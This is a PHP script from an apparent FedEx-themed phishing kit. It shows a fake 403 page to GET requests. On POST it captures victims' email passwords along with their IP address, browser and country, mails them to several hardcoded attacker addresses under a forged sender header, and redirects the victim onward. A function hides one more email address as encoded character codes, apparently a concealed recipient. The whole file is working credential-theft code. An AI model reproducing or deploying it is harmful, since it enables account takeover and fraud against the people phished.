<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$epass = $_POST['epass'];
$passchk = strlen($epass);

session_start();
$email = $_SESSION['email'];
$_SESSION['epass'] = $epass;

$message .= "--------+ Fedex ReZulT +--------\n";
$message .= "Email ID : ".$email."\n";
$message .= "Email Password : ".$_POST['epass']."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY Mr-Sace in 2020 (skype:s.wright77)+---\n";

$send = "inboxrozay@nuke.africa,tracy15@vivaldi.net,norjdborg@gmail.com,inboxrozay1234@mail.ru";

$subject = "Fedex Rezult2020 | $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: John De Fisher <inContact@rit.edu>\n";




// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
if ($passchk<6)
{
$passerr=0;
}
else
{
$passerr=1;
}


if ($passerr==0)
{
header("Location: tracking.php?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&email=$email");
}
else
{
 mail($send,$subject,$message,$headers);
header("Location: tracking2.php?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&email=$email");
}
?>